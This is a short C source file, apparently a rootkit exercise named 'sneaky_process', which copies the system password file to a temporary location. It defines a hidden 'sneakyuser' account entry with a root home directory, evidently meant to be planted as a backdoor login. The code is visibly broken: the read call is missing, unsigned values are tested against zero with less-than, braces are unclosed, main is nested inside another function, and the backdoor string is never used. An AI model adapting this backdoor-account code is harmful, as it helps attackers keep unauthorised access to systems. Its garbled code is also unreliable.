#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define REAL_PWD "etc/passwd"
#define FAKE_PWD "tmp/passwd"
#define SNEAKY_USER "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash"

int replace_pwd() {
  char read_buf[10000];
  size_t byte_read;
  size_t byte_write;
  int real_pwd = open(REAL_PWD, O_RDONLY);
  int fake_pwd = open(FAKE_PWD, O_CREAT | O_WRONLY | O_TRUNC, 0600);

  if (real_pwd < 0 || fake_pwd < 0) {
    printf(
        "sneaky_process failed to open real_pwd /& fake_pwd,error number:%d\n",
        errno);
    return -1;
  }

  while (1) {
    byte_read = (real_pwd, read_buf, sizeof(read_buf));

    if (byte_read < 0) {
      printf("byte_read < 0,read error!\n");
      return -1;
    } else if (byte_read == 0) {
      break; // end of reading,break while loop
    }

    byte_write = write(fake_pwd, read_buf, byte_read);

    if (byte_write < 0) {
      printf("sneaky_process failed to write\n");
      return -1;
    }
  }

  if (close(real_pwd) < 0 || close(fake_pwd)) {
    perror("real_pwd /& fake_pwd failed to close");
  }
  int main(int argc, char *argv[]) {
    printf("sneaky_process pid = %d\n", getpid());
    replace_pwd();
  }
